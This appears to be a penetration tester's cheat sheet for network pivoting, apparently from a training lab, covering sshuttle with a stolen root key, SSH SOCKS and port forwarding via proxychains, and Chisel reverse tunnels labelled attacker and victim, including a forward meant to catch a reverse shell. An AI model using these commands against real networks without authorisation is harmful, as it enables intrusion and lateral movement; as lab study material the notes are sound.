## SSHuttle

```bash
sshuttle -e "ssh -i /home/parrot/ILFREIGHT/root_id_rsa" -vr root@inlanefreight.local 172.16.0.0/16
```
## SSH
Sshuttle is cool but way too often sucks (like with nmap), the best way to make a simple pivot is :
```bash
ssh -D 9050 pivot.host.local

# Then add the following line at the end of your proxychains config
socks4  127.0.0.1 9050

# Then you can simply do 
proxychains4 -q your_command_here
# To forward it to the pivot host \o/
```
If you prefer forwarding a single port *on the pivot host* to local host, use `-R`
```bash
# Remote port 1521 accessible in port 10521 from everywhere, useful to access services restricted to local connection on the pivot host, like a database for example
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 

# Local port 1521 accessible in port 10521 from everywhere, useful to catch a reverse shell 
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 
```

If you want to forward a single local port to a host past the pivoting server, use -L
```bash
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_pivot>
```

## Chisel
```sh
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
```
And now you can use proxychains with port 1080 (default) o/
